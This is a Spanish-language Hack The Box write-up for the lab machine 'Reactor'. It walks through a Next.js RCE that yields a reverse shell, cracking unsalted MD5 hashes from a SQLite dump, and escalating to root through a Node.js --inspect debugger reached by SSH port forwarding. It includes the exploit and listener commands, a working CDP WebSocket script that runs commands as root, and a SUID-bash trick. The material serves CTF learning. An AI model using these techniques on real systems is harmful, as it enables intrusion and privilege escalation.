# HTB - Reactor Writeup

**Autor:** TRNNSK
**Dificultad:** Medium
**Sistema:** Linux

---

# Resumen

La máquina **Reactor** presenta una aplicación Next.js en el puerto 3000 vulnerable a RCE. Tras obtener shell como `node`, se extrae una base de datos SQLite con hashes MD5 sin sal que permiten obtener credenciales del usuario `engineer`. Para escalar a root se abusa de un proceso Node.js corriendo como root con el flag `--inspect`, lo que expone el Chrome DevTools Protocol (CDP) en localhost — al hacer port forwarding via SSH y conectarse al debugger se ejecuta código arbitrario como root.

---

# Enumeración

## Escaneo inicial

```bash
nmap -T4 -sC -sV 10.129.8.228
```

### Resultados:

```
22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu
3000/tcp open  http  Next.js (X-Powered-By: Next.js)
```

Solo dos puertos — SSH y una aplicación web Next.js en el puerto 3000.

---

# Análisis Web

Al acceder a `http://reactor.htb:3000` se presenta una aplicación web construida con **Next.js 15.0.3**. Buscando vulnerabilidades conocidas para esta versión y el nombre de la aplicación se identifica un exploit de RCE disponible públicamente: `react2shell-poc`.

---

# Vulnerabilidades

## RCE en Next.js — react2shell-poc

La aplicación es vulnerable a ejecución remota de código. El exploit `react2shell-poc` automatiza el proceso de obtener un reverse shell.

---

# Explotación (Foothold)

## Paso 1 — Reverse shell via react2shell-poc

```bash
# Terminal 1 — Listener
rlwrap -cAr nc -lnvp 4444

# Terminal 2 — Exploit
git clone https://github.com/react2shell-poc
cd react2shell-poc
python3 react2shell-poc.py -t http://10.129.8.228:3000 --revshell --lhost TU_IP --lport 4444
```

## Paso 2 — Estabilizar la shell

```bash
node@reactor:/opt/reactor-app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
node@reactor:/opt/reactor-app$ export TERM=xterm
```

Se obtiene shell como `node`.

---

# Lateral Movement — node → engineer

## Extracción de la base de datos

En el directorio de trabajo `/opt/reactor-app` hay un archivo `reactor.db`:

```bash
node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db

node@reactor:/opt/reactor-app$ sqlite3 reactor.db '.dump'
```

### Contenido de la tabla users:

```sql
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

Dos cuentas con hashes MD5 sin sal — trivialmente reversibles via tablas de lookup.

## Crackeo del hash MD5

Se usa CrackStation para crackear el hash de `engineer`:

```
39d97110eafe2a9a68639812cd271e8e → reactor1
```

Credenciales obtenidas: `engineer:reactor1`

## SSH como engineer

```bash
ssh engineer@10.129.8.228
# contraseña: reactor1
```

Flag de usuario:
```bash
cat /home/engineer/user.txt
```

---

# Escalada de Privilegios — Node.js --inspect CDP

## Identificación

`engineer` no tiene derechos de sudo. Se revisan los procesos en ejecución:

```bash
engineer@reactor:~$ ps aux | grep node
node  1413  next-server (v15.0.3)
root  1415  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Root está corriendo un proceso Node.js con el flag `--inspect=127.0.0.1:9229`. Este flag habilita el **Chrome DevTools Protocol (CDP)** — un debugger que permite evaluar JavaScript arbitrario dentro del proceso. Como el proceso pertenece a root, cualquier código inyectado se ejecuta como root.

El debugger está ligado a `127.0.0.1` — solo accesible localmente. Se hace port forwarding via SSH.

## Explotación

### Paso 1 — Port forwarding del puerto 9229

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.8.228
```

### Paso 2 — Conectar via Chrome DevTools

Abre Chromium/Chrome y navega a `chrome://inspect`. Haz click en **Configure** y añade `localhost:9229`. El proceso root (`/opt/uptime-monitor/worker.js`, pid=1415) aparece bajo **Remote Target**. Click en **inspect** para abrir la consola DevTools conectada al proceso root.

### Paso 3 — Ejecutar código como root

En la consola de DevTools:

```javascript
require('child_process').execSync('chmod u+s /bin/bash').toString()
```

Esto ejecuta `chmod u+s /bin/bash` dentro del proceso root, poniendo el bit SUID en `/bin/bash`.

### Alternativa — WebSocket client sin navegador

```javascript
const WebSocket = require('ws');
fetch('http://127.0.0.1:9229/json').then(r => r.json()).then(targets => {
  const ws = new WebSocket(targets[0].webSocketDebuggerUrl);
  ws.on('open', () => {
    ws.send(JSON.stringify({
      id: 1,
      method: 'Runtime.evaluate',
      params: { expression: 'require("child_process").execSync("chmod u+s /bin/bash").toString()' }
    }));
  });
});
```

### Paso 4 — Shell root

```bash
engineer@reactor:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31 2024 /bin/bash

engineer@reactor:~$ /bin/bash -p
bash-5.2#
```

La `s` en la posición de ejecución del owner confirma el bit SUID. `bash -p` lanza bash con el EUID del dueño del archivo (root) en vez del del caller.

---

# Obtener la Flag

```bash
bash-5.2# cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap — SSH en 22 y Next.js en 3000
2. Identificar versión de Next.js 15.0.3 vulnerable a RCE
3. Usar react2shell-poc para obtener reverse shell como `node`
4. Encontrar `reactor.db` en `/opt/reactor-app`
5. Extraer hashes MD5 sin sal con sqlite3
6. Crackear hash de `engineer` con CrackStation → `reactor1`
7. SSH como `engineer`
8. Identificar proceso Node.js de root con `--inspect=127.0.0.1:9229`
9. Hacer port forwarding del puerto 9229 via SSH
10. Conectar Chrome DevTools a `localhost:9229`
11. Ejecutar `chmod u+s /bin/bash` desde la consola DevTools
12. `bash -p` para obtener shell root

---

# Conclusión

Esta máquina demuestra cómo:

- Las aplicaciones Next.js mal configuradas pueden ser vulnerables a RCE
- Las bases de datos locales con hashes sin sal exponen credenciales del sistema
- El flag `--inspect` de Node.js expone el Chrome DevTools Protocol que permite ejecución arbitraria de código con los privilegios del proceso
- El port forwarding SSH permite acceder a servicios locales que de otra manera serían inaccesibles remotamente

---

y ya
